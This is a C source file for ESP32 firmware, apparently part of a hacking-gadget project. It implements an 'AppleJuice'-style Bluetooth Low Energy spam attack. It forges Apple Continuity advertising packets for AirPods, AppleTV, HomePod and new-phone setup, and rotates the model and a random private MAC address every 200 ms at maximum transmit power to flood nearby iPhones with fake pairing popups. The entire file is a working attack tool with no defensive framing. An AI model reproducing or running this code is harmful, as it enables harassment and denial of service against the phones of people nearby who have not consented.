#include "ble_airspam.h"

#include <string.h>
#include "esp_log.h"
#include "esp_random.h"
#include "esp_bt.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"

#include "ble_hid_gap.h"
#include "ble_hid_keyboard.h"

#if CONFIG_BT_NIMBLE_ENABLED
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/util/util.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"

void ble_store_config_init(void);
#endif

static const char *TAG = "ble_airspam";

typedef enum {
    PKT_AUDIO = 0,
    PKT_SETUP,
} pkt_kind_t;

typedef struct {
    uint8_t model_id;
    pkt_kind_t kind;
} apple_dev_t;

/* Prefer models known to popup often (AppleJuice / EvilAppleJuice). */
static const apple_dev_t s_devices[] = {
    {0x02, PKT_AUDIO}, /* AirPods */
    {0x0E, PKT_AUDIO}, /* AirPods Pro */
    {0x0F, PKT_AUDIO}, /* AirPods Gen 2 */
    {0x13, PKT_AUDIO}, /* AirPods Gen 3 */
    {0x14, PKT_AUDIO}, /* AirPods Pro Gen 2 */
    {0x0A, PKT_AUDIO}, /* AirPods Max */
    {0x01, PKT_SETUP}, /* AppleTV Setup — long range */
    {0x06, PKT_SETUP}, /* AppleTV Pair */
    {0x09, PKT_SETUP}, /* Setup New Phone */
    {0x0B, PKT_SETUP}, /* Homepod Setup */
};

static const int s_dev_count = (int)(sizeof(s_devices) / sizeof(s_devices[0]));

static volatile bool s_active;
static TaskHandle_t s_task;

#if CONFIG_BT_NIMBLE_ENABLED
static void ble_host_task(void *param)
{
    (void)param;
    nimble_port_run();
    nimble_port_freertos_deinit();
}

static int on_gap(struct ble_gap_event *event, void *arg)
{
    (void)arg;
    if (event->type == BLE_GAP_EVENT_ADV_COMPLETE) {
        ESP_LOGD(TAG, "adv complete reason=%d", event->adv_complete.reason);
    }
    return 0;
}

static esp_err_t ensure_stack(void)
{
    if (ble_hid_keyboard_stack_ready()) {
        for (int i = 0; i < 50 && !ble_hs_synced(); i++) {
            vTaskDelay(pdMS_TO_TICKS(20));
        }
        return ble_hs_synced() ? ESP_OK : ESP_ERR_TIMEOUT;
    }

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    if (ret != ESP_OK) {
        return ret;
    }

    ret = esp_hid_gap_init(HIDD_BLE_MODE);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "gap init %d", ret);
        return ret;
    }

    ble_store_config_init();
    ble_hs_cfg.store_status_cb = ble_store_util_status_rr;
    ret = esp_nimble_enable(ble_host_task);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "nimble enable %d", ret);
        return ret;
    }

    for (int i = 0; i < 100 && !ble_hs_synced(); i++) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    if (!ble_hs_synced()) {
        ESP_LOGE(TAG, "ble host not synced");
        return ESP_ERR_TIMEOUT;
    }

    ble_hid_keyboard_mark_stack_ready();
    return ESP_OK;
}

static int build_packet(uint8_t *buf, const apple_dev_t *dev)
{
    memset(buf, 0, 31);
    if (dev->kind == PKT_AUDIO) {
        static const uint8_t hdr[] = {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07};
        static const uint8_t body[] = {0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
        memcpy(buf, hdr, sizeof(hdr));
        buf[7] = dev->model_id;
        memcpy(buf + 8, body, sizeof(body));
        return 31;
    }

    static const uint8_t prefix[] = {
        0x16, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC1};
    static const uint8_t suffix[] = {0x60, 0x4C, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    memcpy(buf, prefix, sizeof(prefix));
    buf[13] = dev->model_id;
    memcpy(buf + 14, suffix, sizeof(suffix));
    return 23;
}

static int spam_once(void)
{
    if (!ble_hs_synced()) {
        return -1;
    }

    uint8_t adv[31];
    const apple_dev_t *dev = &s_devices[esp_random() % (uint32_t)s_dev_count];
    int len = build_packet(adv, dev);

    (void)ble_gap_adv_stop();
    vTaskDelay(pdMS_TO_TICKS(15));

    /* Random NRPA */
    uint8_t addr[6];
    esp_fill_random(addr, sizeof(addr));
    addr[0] = (uint8_t)((addr[0] & 0x3F) | 0x40); /* non-resolvable private */

    int rc = ble_hs_id_set_rnd(addr);
    if (rc != 0) {
        /* fall back to whatever address stack already has */
        ESP_LOGW(TAG, "set_rnd rc=%d — using infer_auto", rc);
    }

    uint8_t own_addr_type = BLE_OWN_ADDR_RANDOM;
    if (rc != 0) {
        ble_hs_util_ensure_addr(0);
        ble_hs_id_infer_auto(0, &own_addr_type);
    }

    rc = ble_gap_adv_set_data(adv, len);
    if (rc != 0) {
        ESP_LOGW(TAG, "adv_set_data rc=%d len=%d", rc, len);
        return rc;
    }

    struct ble_gap_adv_params params;
    memset(&params, 0, sizeof(params));
    params.conn_mode = BLE_GAP_CONN_MODE_NON;
    params.disc_mode = BLE_GAP_DISC_MODE_GEN;
    params.itvl_min = BLE_GAP_ADV_ITVL_MS(20);
    params.itvl_max = BLE_GAP_ADV_ITVL_MS(20);

    rc = ble_gap_adv_start(own_addr_type, NULL, BLE_HS_FOREVER, &params, on_gap, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "adv_start rc=%d type=%u", rc, own_addr_type);
    }
    return rc;
}

static void spam_task(void *arg)
{
    (void)arg;
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
    ESP_LOGI(TAG, "Apple Continuity spam running (no BT-list entry — iOS popup only)");

    int ok = 0;
    int fail = 0;
    while (s_active) {
        if (spam_once() == 0) {
            ok++;
        } else {
            fail++;
        }
        if (((ok + fail) % 25) == 0) {
            ESP_LOGI(TAG, "spam stats ok=%d fail=%d", ok, fail);
        }
        /* Keep each packet on-air briefly, then hop model/MAC */
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    if (ble_hs_synced()) {
        (void)ble_gap_adv_stop();
    }
    ESP_LOGI(TAG, "spam stopped ok=%d fail=%d", ok, fail);
    s_task = NULL;
    vTaskDelete(NULL);
}
#endif

esp_err_t ble_airspam_start(void)
{
#if !CONFIG_BT_NIMBLE_ENABLED
    return ESP_ERR_NOT_SUPPORTED;
#else
    if (s_active) {
        return ESP_OK;
    }

    esp_err_t ret = ensure_stack();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "ensure_stack failed %d", ret);
        return ret;
    }

    ble_hid_keyboard_set_want_adv(false);
    ble_hid_keyboard_pause_adv();

    s_active = true;
    if (xTaskCreate(spam_task, "ble_airspam", 4096, NULL, 5, &s_task) != pdPASS) {
        s_active = false;
        return ESP_ERR_NO_MEM;
    }
    ESP_LOGI(TAG, "airspam task started");
    return ESP_OK;
#endif
}

void ble_airspam_stop(void)
{
    if (!s_active) {
        return;
    }
    s_active = false;
    for (int i = 0; i < 50 && s_task; i++) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }
#if CONFIG_BT_NIMBLE_ENABLED
    if (ble_hs_synced()) {
        (void)ble_gap_adv_stop();
    }
#endif
    ble_hid_keyboard_resume_adv_if_active();
}

bool ble_airspam_is_active(void)
{
    return s_active;
}
